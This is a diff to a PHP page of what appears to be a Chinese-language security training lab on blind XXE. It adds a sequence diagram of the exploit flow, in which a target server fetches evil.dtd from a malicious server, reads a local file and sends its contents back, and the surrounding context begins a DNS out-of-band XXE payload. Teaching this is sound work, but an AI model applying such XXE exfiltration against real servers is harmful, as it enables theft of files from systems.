@@ -66,6 +66,27 @@ $content = <<<'EOT'
                 <div class="card-body">
                     <p class="mb-3">本场景演示盲XXE漏洞，尝试以下攻击：</p>
 
+                    <div class="mb-4">
+                        <h5 class="mb-3">🔄 盲XXE利用流程</h5>
+                        <div class="bg-light p-3 rounded border">
+                            <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+                            <div class="mermaid">
+                                sequenceDiagram
+                                    participant Attacker as 攻击者
+                                    participant Server as 目标服务器
+                                    participant Evil as 恶意服务器
+                                    
+                                    Attacker->>Server: 发送包含外部实体的XML
+                                    Server->>Server: 解析XML，触发外部实体
+                                    Server->>Evil: 请求evil.dtd文件
+                                    Evil-->>Server: 返回evil.dtd内容
+                                    Server->>Server: 处理DTD，读取本地文件
+                                    Server->>Evil: 发送文件内容到恶意服务器
+                                    Evil-->>Attacker: 攻击者获取文件内容
+                            </div>
+                        </div>
+                    </div>
+
                     <h5 class="mb-2">1. DNS带外通道</h5>
                     <pre class="bg-dark text-light p-3 rounded"><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
 &lt;!DOCTYPE root [
